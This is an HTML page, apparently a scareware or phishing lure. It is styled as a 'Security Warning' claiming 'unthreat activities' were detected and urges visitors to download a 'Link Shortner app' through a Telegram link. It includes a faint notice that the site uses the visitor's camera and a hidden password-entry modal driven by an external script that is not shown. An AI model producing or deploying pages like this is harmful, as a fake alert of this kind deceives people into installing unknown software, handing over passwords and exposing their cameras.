<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Warning</title>
    <link rel="stylesheet" href="/css/style.css">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        .warning-container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 500px;
            width: 90%;
        }
        
        .warning-text {
            font-size: 32px;
            color: #e74c3c;
            font-weight: bold;
            margin-bottom: 20px;
            line-height: 1.2;
        }
        
        .sub-text {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }
        
        .buttons {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
        }
        
        .download-btn {
            background: #3498db;
            color: white;
        }
        
        .help-btn {
            background: #f1f1f1;
            color: #333;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .camera-notice {
            font-size: 10px;
            color: #999;
            margin-top: 30px;
            opacity: 0.7;
        }
        
        #passwordModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 15px;
            width: 300px;
        }
        
        .modal-title {
            margin-bottom: 20px;
            color: #333;
        }
        
        .password-input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 2px solid #ddd;
            border-radius: 5px;
        }
        
        .modal-btn {
            width: 100%;
            padding: 10px;
            background: #2ecc71;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="warning-container">
        <div class="warning-text">
            Our system detected unthreat activities
        </div>
        
        <div class="sub-text">
            For better expression download our Link Shortner app by clicking on download button
        </div>
        
        <div class="buttons">
            <button class="btn download-btn" onclick="window.open('https://t.me/example', '_blank')">
                Download App
            </button>
            
            <button class="btn help-btn" onclick="showHelp()">
                Facing Issue
            </button>
        </div>
        
        <div class="camera-notice">
            Note- Site Use Your Cam
        </div>
    </div>
    
    <!-- Password Modal -->
    <div id="passwordModal">
        <div class="modal-content">
            <h3 class="modal-title">Enter Password</h3>
            <input type="password" class="password-input" id="passwordInput" placeholder="Enter password">
            <button class="modal-btn" onclick="verifyPassword()">Submit</button>
        </div>
    </div>
    
    <script src="/js/warning.js"></script>
</body>
</html>
